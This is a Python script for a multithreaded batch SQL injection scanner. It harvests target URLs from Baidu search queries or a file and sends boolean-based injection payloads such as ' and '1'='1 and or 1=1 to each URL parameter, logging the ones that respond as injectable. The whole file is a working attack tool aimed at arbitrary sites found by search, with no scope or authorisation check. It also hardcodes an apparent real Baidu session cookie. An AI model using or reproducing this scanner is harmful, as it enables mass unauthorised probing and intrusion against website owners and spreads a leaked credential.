# -*- coding: utf-8 -*-
#!E:\\python\\python.exe
import requests
import threading
import re
import time
import sys
from optparse import OptionParser


class Batch_SQL_Injection_Scan():
    def __init__(self):
        self.baidu_flag=0
        self.pause_flag=False
        self.banner='''
    ____  ___  ______________  __    _____ ____    __         _____   __    __
   / __ )/   |/_  __/ ____/ / / /   / ___// __ \  / /        /  _/ | / /   / /
  / __  / /| | / / / /   / /_/ /    \__ \/ / / / / /         / //  |/ /_  / / 
 / /_/ / ___ |/ / / /___/ __  /    ___/ / /_/ / / /___     _/ // /|  / /_/ /  
/_____/_/  |_/_/  \____/_/ /_/____/____/\___\_\/_____/____/___/_/ |_/\____/   
                            /_____/                 /_____/                   
    __________________________  _   __    _____ _________    _   __
   / ____/ ____/_  __/  _/ __ \/ | / /   / ___// ____/   |  / | / /
  / __/ / /     / /  / // / / /  |/ /    \__ \/ /   / /| | /  |/ / 
 / /___/ /___  / / _/ // /_/ / /|  /    ___/ / /___/ ___ |/ /|  /  
/_____/\____/ /_/ /___/\____/_/ |_/____/____/\____/_/  |_/_/ |_/   
                                 /_____/                           
                                 
        '''
        self.usage="option -h/--help to get help"
        self.sql_statement()
        self.url_list=[]
        self.User_Agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134'
        self.Cookie='BAIDUID=E129C7314626E9E3E48EDB8849CB2D64:SL=0:NR=50:FG=1; BIDUPSID=05CB85424D39AF001BEE9F63FE3DC100; PSTM=1575649528; BD_UPN=13314752; __cfduid=d7ea233a8435758d7c6c791573c056c921575717023; BDUSS=29pZk5qT3A1UWk1SHNnQjFoTjFlUXlMTlBGYWVZVGlRWDd0bHlEQlRxUFhKWjllRVFBQUFBJCQAAAAAAAAAAAEAAADN5e3AaWFtaGFja2Vya2lkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANeYd17XmHdeZ; MCITY=-9019%3A; H_WISE_SIDS=147719_146488_109775_142018_147276_148320_147887_148194_147280_146538_148001_147722_147828_147889_146573_148524_147346_127969_147593_147238_146551_146454_145417_146652_147024_147353_146732_148186_131423_144659_142207_147528_148201_107315_146824_148299_146395_144966_145608_139883_146786_148346_147711_146054_145398_110085; ispeed_lsm=2; H_PS_PSSID=32293_1436_32357_31253_32351_32045_32116_31321_26350; BDORZ=B490B5EBF6F3CD402E515D22BCDA1598; yjs_js_security_passport=9b1515b61212865c34b0a2243eca06758ad8420f_1595754991_js; delPer=0; BD_CK_SAM=1; PSINO=1; H_PS_645EC=d2a37eote8p3z4LmxwiqgmUyhdprmkB0bkfSAvaeHzHjVP7ykFpNKPABmMU; COOKIE_SESSION=0_0_1_0_0_0_1_0_1_0_0_0_0_0_0_0_0_0_1595818596%7C1%230_0_1595818596%7C1; ZD_ENTRY=baidu; sug=3; sugstore=0; ORIGIN=0; bdime=0'
        self.headers={'User_Agent':self.User_Agent,'Cookie':self.Cookie}
        self.timeout=2
        self.thread_num=10
        self.thread_list=[]
        self.baidu_thread_list=[]

    def sql_statement(self):#sql语句存放点
        self.sql_num_and_list = [[' and 1=1',' and 1=2']]
        self.sql_str_and_list = [["' and '1'='1","'and '1'='2"],['" and "1"="1','" and "1"="2']]
        self.sql_num_or_list = [[' or 1=1',' or 1=2']]
        self.sql_str_or_list = [["' or '1'='1","' or '1'='2"],['" or "1"="1','" or "1"="2']]
        self.sql_error_list = [[]]

    def init_input(self):
        use = "python Batch_Scan_SQL_Injection.py [option] [value]"
        parser = OptionParser(usage=use, version="%prog 3.0")
        parser.add_option("-u", "--url", dest="url", help="Please input test url")
        parser.add_option("-f", "--file", dest="file", help="Please input url file")
        parser.add_option("-t", "--thread", dest="thread", help="Please select thread[default=10]")
        parser.add_option("-i", "--baidu_thread", dest="baidu_thread", help="Please select baidu spider thread[default=10]")
        parser.add_option("-b", "--baidu", dest="baidu", help="Please input baidu grammer")
        parser.add_option("-k","--key_file",dest="key_file",help="Please input baidu statement file")
        parser.add_option("-p", "--page", dest="page", help="Please select the number of pages to crawl")
        parser.add_option("-s", "--save", dest="save", help="Please input save file")
        parser.add_option("-o","--timeout",dest="timeout",help="Please input out time")
        option,args = parser.parse_args()
        self.url = option.url
        self.url_file_name = option.file
        self.thread_num = int(option.thread if option.thread!=None else 10)
        self.baidu_thread_num = int(option.baidu_thread if option.baidu_thread!=None else 10)
        self.baidu_key = option.baidu
        self.page = int(option.page if option.page!=None else 5)
        self.save_file_name = option.save
        self.key_file_name = option.key_file
        self.timeout = int(option.timeout if option.timeout!=None else 2)

    def main(self):
        try:
            print(self.banner)
            self.init_input()
            print("#####################################START#####################################")
            if self.save_file_name!=None:
                self.save_file = open(self.save_file_name,"a")
            if self.url!=None:
                params = self.get_params(self.url)
                if params==[]:
                    return
                and_inject_params, or_inject_params = self.str_sql_injection_run(self.url, params)
                if and_inject_params != []:
                    print("The parameter {} of {} has an character type and injection.".format(and_inject_params, self.url))
                    if self.save_file_name != None and not self.pause_flag:
                        self.save_file.write("The parameter {} of {} has an character type and injection.\n".format(and_inject_params, self.url))
                        self.save_file.close()
                    print("######################################END######################################")
                    return
                elif or_inject_params != []:
                    print("The parameter {} of {} has an character type or injection.".format(or_inject_params, self.url))
                    if self.save_file_name != None and not self.pause_flag:
                        self.save_file.write("The parameter {} of {} has an character type or injection.\n".format(or_inject_params, self.url))
                        self.save_file.close()
                    print("######################################END######################################")
                    return
                and_inject_params, or_inject_params = self.num_sql_injection_run(self.url, params)
                if and_inject_params != []:
                    print("The parameter {} of {} has an digital type and injection.".format(and_inject_params, self.url))
                    if self.save_file_name != None and not self.pause_flag:
                        self.save_file.write("The parameter {} of {} has an digital type and injection.\n".format(and_inject_params, self.url))
                        self.save_file.close()
                    print("######################################END######################################")
                    return
                elif or_inject_params != []:
                    print("The parameter {} of {} has an digital type or injection.".format(or_inject_params, self.url))
                    if self.save_file_name != None and not self.pause_flag:
                        self.save_file.write(("The parameter {} of {} has an digital type or injection.\n".format(or_inject_params, self.url)))
                        self.save_file.close()
                    print("######################################END######################################")
                    return
                if self.pause_flag:
                    if self.save_file_name!=None:
                        self.save_file.close()
                    print("Keyboard Interrupt.")
                    return
                if self.save_file_name != None:
                    self.save_file.close()
                return
            if self.url_file_name!=None:
                url_file = open(self.url_file_name,'r')
                self.url_list = url_file.readlines()
                for url in self.url_list:
                    if self.pause_flag:
                        if self.save_file_name!=None:
                            self.save_file.close()
                        print("Keyboard Interrupt.")
                        return
                    url=url.replace('\n','')
                    params = self.get_params(url)
                    and_inject_params, or_inject_params = self.str_sql_injection_run(url, params)
                    if and_inject_params != []:
                        print("The parameter {} of {} has an character type and injection.".format(and_inject_params,url))
                        if self.save_file_name!=None and not self.pause_flag:
                            self.save_file.write("The parameter {} of {} has an character type and injection.\n".format(and_inject_params,url))
                        continue
                    elif or_inject_params != []:
                        print("The parameter {} of {} has an character type or injection.".format(or_inject_params,url))
                        if self.save_file_name!=None and not self.pause_flag:
                            self.save_file.write("The parameter {} of {} has an character type or injection.\n".format(or_inject_params,url))
                        continue
                    and_inject_params, or_inject_params = self.num_sql_injection_run(url, params)
                    if and_inject_params != []:
                        print("The parameter {} of {} has an digital type and injection.".format(and_inject_params, url))
                        if self.save_file_name!=None and not self.pause_flag:
                            self.save_file.write("The parameter {} of {} has an digital type and injection.\n".format(and_inject_params, url))
                        continue
                    elif or_inject_params != []:
                        print("The parameter {} of {} has an digital type or injection.".format(or_inject_params, url))
                        if self.save_file_name!=None and not self.pause_flag:
                            self.save_file.write("The parameter {} of {} has an digital type or injection.\n".format(or_inject_params, url))
                        continue
                print("######################################END######################################")
                if self.save_file_name!=None:
                    self.save_file.close()
                return
            if self.baidu_key!=None:
                for i in range(self.thread_num):
                    t = threading.Thread(target=self.sql_injection)
                    t.setDaemon(True)
                    self.thread_list.append(t)
                    t.start()
                self.baidu_spider_run(self.baidu_key)
                while self.url_list!=[] and not self.pause_flag:
                    continue
                if self.pause_flag:
                    if self.save_file_name!=None:
                        self.save_file.close()
                    print("Keyboard Interrupt.")
                    return

                self.pause_flag=1
                if self.save_file_name != None:
                    self.save_file.close()
                print("######################################END######################################")
                return
            if self.key_file_name!=None:
                key_file = open(self.key_file_name,'r')
                for i in range(self.thread_num):
                    t = threading.Thread(target=self.sql_injection)
                    t.setDaemon(True)
                    self.thread_list.append(t)
                    t.start()
                all_key_list = key_file.readlines()
                all_key_list_len=len(all_key_list)
                key_list_len = all_key_list_len//self.baidu_thread_num
                for i in range(self.baidu_thread_num):
                    t = threading.Thread(target=self.baidu_spider,args=(all_key_list[i*key_list_len:(i+1)*key_list_len],))
                    t.setDaemon(True)
                    self.baidu_thread_list.append(t)
                    t.start()
                mod=all_key_list_len%self.baidu_thread_num
                if mod:
                    self.baidu_spider(all_key_list[-mod:])
                while self.baidu_flag != self.baidu_thread_num and not self.pause_flag:
                    continue
                if self.pause_flag:
                    if self.save_file_name!=None:
                        self.save_file.close()
                    print("Keyboard Interrupt.")
                    return
                self.pause_flag = 1
                if self.save_file_name != None:
                    self.save_file.close()
                print("######################################END######################################")
                return
            print(self.usage)
        except KeyboardInterrupt:
            self.pause_flag=1
            if self.save_file_name != None:
                self.save_file.close()
            print("Keyboard Interrupt.")
            return
    def baidu_spider(self,key_list):
        for key in key_list:
            self.baidu_spider_run(key)
        self.baidu_flag+=1
    def baidu_spider_run(self,key):
        for p in range(0, self.page * 50 + 1, 50):
            if self.pause_flag:
                return
            pattern = 'data-tools=\'{"title":"(.*?)","url":"(.*?)"}\''
            baidu_url = 'http://www.baidu.com/s?wd={}&pn={}&cl=3&f4s=&isid='.format(key, p)
            try:
                r = requests.get(baidu_url,headers={'User-Agent':self.User_Agent,'Cookie':self.Cookie},timeout=self.timeout)
            except KeyboardInterrupt:
                self.pause_flag=1
                return
            except:
                continue
            res = re.findall(pattern, r.text)
            for reg in res:
                try:
                    new_url = requests.get(reg[1], timeout=self.timeout).url
                    self.url_list.append(new_url)
                except KeyboardInterrupt:
                    self.pause_flag=1
                    return
                except:
                    pass
    def get_params(self,url):
        paramq=''
        params=[]
        for i in url.split("?")[1:]:
            paramq+=i
        for i in paramq.split("&"):
            a=i.split("=")
            try:
                params.append([a[0],a[1]])
            except KeyboardInterrupt:
                self.pause_flag=1
                return []
            except:
                continue
        try:
            params.remove([''])
        except KeyboardInterrupt:
            self.pause_flag=1
            return []
        except:
            pass
        return params
    def sql_injection(self):
        while not self.pause_flag:
            for url in self.url_list:
                try:
                    self.url_list.remove(url)
                except KeyboardInterrupt:
                    self.pause_flag = 1
                    return
                except:
                    pass
                if self.pause_flag:
                    break
                try:
                    params=self.get_params(url)
                except KeyboardInterrupt:
                    self.pause_flag = 1
                    return
                except:
                    continue
                if params==[]:
                    continue
                and_inject_params,or_inject_params=self.str_sql_injection_run(url,params)
                if and_inject_params!=[]:
                    print("The parameter {} of {} has an character type and injection.".format(and_inject_params,url))
                    if self.save_file_name!=None and not self.pause_flag:
                        self.save_file.write("The parameter {} of {} has an character type and injection.\n".format(and_inject_params,url))
                    continue
                elif or_inject_params!=[]:
                    print("The parameter {} of {} has an character type or injection.".format(or_inject_params, url))
                    if self.save_file_name != None and not self.pause_flag:
                        self.save_file.write("The parameter {} of {} has an character type or injection.\n".format(or_inject_params, url))
                    continue
                params=self.get_params(url)
                and_inject_params,or_inject_params=self.num_sql_injection_run(url,params)
                if and_inject_params!=[]:
                    print("The parameter {} of {} has an digital type and injection.".format(and_inject_params,url))
                    if self.save_file_name != None and not self.pause_flag:
                        self.save_file.write("The parameter {} of {} has an digital type and injection.\n".format(and_inject_params,url))
                    continue
                elif or_inject_params!=[]:
                    print("The parameter {} of {} has an digital type or injection.".format(or_inject_params, url))
                    if self.save_file_name != None and not self.pause_flag:
                        self.save_file.write("The parameter {} of {} has an digital type or injection.\n".format(or_inject_params, url))
                    continue
    def str_sql_injection_run(self,url,params):
        try:
            tr = requests.get(url, headers=self.headers,timeout=self.timeout)
        except KeyboardInterrupt:
            self.pause_flag=1
            return [],[]
        except:
            return [],[]
        and_inject_params = []
        or_inject_params = []
        if tr.status_code == 302 or tr.status_code == 404 or tr.status_code == 501 or tr.status_code == 403:
            return [],[]
        for param in params:
            af = 0
            for sql in self.sql_str_and_list:
                payload = param[0] + '=' + param[1] + sql[0]
                turl = url
                turl = turl.replace(param[0] + '=' + param[1], payload)
                try:
                    r = requests.get(turl, headers=self.headers,timeout=self.timeout)
                except KeyboardInterrupt:
                    self.pause_flag=1
                    return [],[]
                except:
                    return [],[]
                if tr.text == r.text:  # and 1=1成功
                    payload = param[0] + '=' + param[1] + sql[1]
                    turl = url
                    turl = turl.replace(param[0] + '=' + param[1], payload)
                    try:
                        r = requests.get(turl, headers=self.headers,timeout=self.timeout)
                    except KeyboardInterrupt:
                        self.pause_flag=1
                        return [],[]
                    except:
                        return [],[]
                    if tr.text != r.text:
                        af = af == 0
            if af:
                and_inject_params.append(param)
                continue
            af = 0
            for sql in self.sql_str_or_list:
                payload = param[0] + '=' + param[1] + sql[1]
                turl = url
                turl = turl.replace(param[0] + '=' + param[1], payload)
                try:
                    r = requests.get(turl, headers=self.headers,timeout=self.timeout)
                except KeyboardInterrupt:
                    self.pause_flag=1
                    return [],[]
                except:
                    return [],[]
                if tr.text == r.text:  # and 1=1成功
                    payload = param[0] + '=' + param[1] + sql[0]
                    turl = url
                    turl = turl.replace(param[0] + '=' + param[1], payload)
                    try:
                        r = requests.get(turl, headers=self.headers,timeout=self.timeout)
                    except KeyboardInterrupt:
                        self.pause_flag=1
                        return [],[]
                    except:
                        return [],[]
                    if tr.text != r.text:
                        af = af == 0
            if af:
                or_inject_params.append(param)
        return and_inject_params, or_inject_params

    def num_sql_injection_run(self,url,params):
        try:
            tr = requests.get(url, headers=self.headers,timeout=self.timeout)
        except KeyboardInterrupt:
            self.pause_flag=1
            return [],[]
        except:
            return [],[]
        and_inject_params = []
        or_inject_params = []
        if tr.status_code == 302 or tr.status_code == 404 or tr.status_code == 501 or tr.status_code == 403:
            return [],[]
        for param in params:
            af = 0
            for sql in self.sql_num_and_list:
                payload = param[0] + '=' + param[1] + sql[0]
                turl = url
                turl = turl.replace(param[0] + '=' + param[1], payload)
                try:
                    r = requests.get(turl, headers=self.headers,timeout=self.timeout)
                except KeyboardInterrupt:
                    self.pause_flag = 1
                    return [], []
                except:
                    return [],[]
                if tr.text == r.text:  # and 1=1成功
                    payload = param[0] + '=' + param[1] + sql[1]
                    turl = url
                    turl = turl.replace(param[0] + '=' + param[1], payload)
                    try:
                        r = requests.get(turl, headers=self.headers,timeout=self.timeout)
                    except KeyboardInterrupt:
                        self.pause_flag = 1
                        return [], []
                    except:
                        return [],[]
                    if tr.text != r.text:
                        af = af == 0
            if af:
                and_inject_params.append(param)
                continue
            af = 0
            for sql in self.sql_num_or_list:
                payload = param[0] + '=' + param[1] + sql[1]
                turl = url
                turl = turl.replace(param[0] + '=' + param[1], payload)
                try:
                    r = requests.get(turl, headers=self.headers,timeout=self.timeout)
                except KeyboardInterrupt:
                    self.pause_flag = 1
                    return [], []
                except:
                    return [],[]
                if tr.text == r.text:  # and 1=1成功
                    payload = param[0] + '=' + param[1] + sql[0]
                    turl = url
                    turl = turl.replace(param[0] + '=' + param[1], payload)
                    try:
                        r = requests.get(turl, headers=self.headers,timeout=self.timeout)
                    except KeyboardInterrupt:
                        self.pause_flag = 1
                        return [], []
                    except:
                        return [],[]
                    if tr.text != r.text:
                        af = af == 0
            if af:
                or_inject_params.append(param)
        return and_inject_params, or_inject_params
    def test(self):
        i=0
        while not self.pause_flag:
            print(i)
            i+=1
            time.sleep(1)
if __name__ == '__main__':
    Batch_SQL_Injection_Scan().main()
